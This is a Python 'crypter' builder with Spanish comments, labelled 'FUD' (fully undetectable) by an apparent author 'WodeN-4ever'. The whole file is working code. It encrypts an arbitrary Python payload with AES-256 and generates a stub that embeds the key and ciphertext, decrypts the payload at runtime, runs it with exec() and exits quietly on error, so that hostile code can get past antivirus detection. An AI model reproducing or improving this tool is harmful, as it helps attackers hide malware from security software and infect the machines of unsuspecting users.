import os
import sys
import base64
import secrets
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad

def cifrar(payload_bytes, key):
    iv = secrets.token_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(payload_bytes, AES.block_size))
    return base64.b64encode(iv + ct)

def main():
    if len(sys.argv) < 3:
        print("Uso: python builder_crypter.py <payload.py> <stub_salida.py>")
        sys.exit(1)
    payload_path = sys.argv[1]
    stub_out = sys.argv[2]
    # Genera clave random (AES-256)
    key = secrets.token_bytes(32)
    with open(payload_path, "rb") as f:
        payload = f.read()
    payload_enc = cifrar(payload, key).decode()
    key_b64 = base64.b64encode(key).decode()

    # Stub principal
    stub_code = f"""# Stub Crypter FUD by WodeN-4ever
import base64
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
import sys

payload_enc = \"\"\"{payload_enc}\"\"\"
key = base64.b64decode("{key_b64}")

def run_payload():
    ct = base64.b64decode(payload_enc)
    iv, data = ct[:16], ct[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    code = unpad(cipher.decrypt(data), AES.block_size)
    exec(code, {{'__name__': '__main__'}})

if __name__ == "__main__":
    try:
        run_payload()
    except Exception as e:
        sys.exit(0)
"""

    with open(stub_out, "w", encoding="utf-8") as f:
        f.write(stub_code)
    print(f"[+] Stub FUD generado como {stub_out}")

if __name__ == "__main__":
    main()
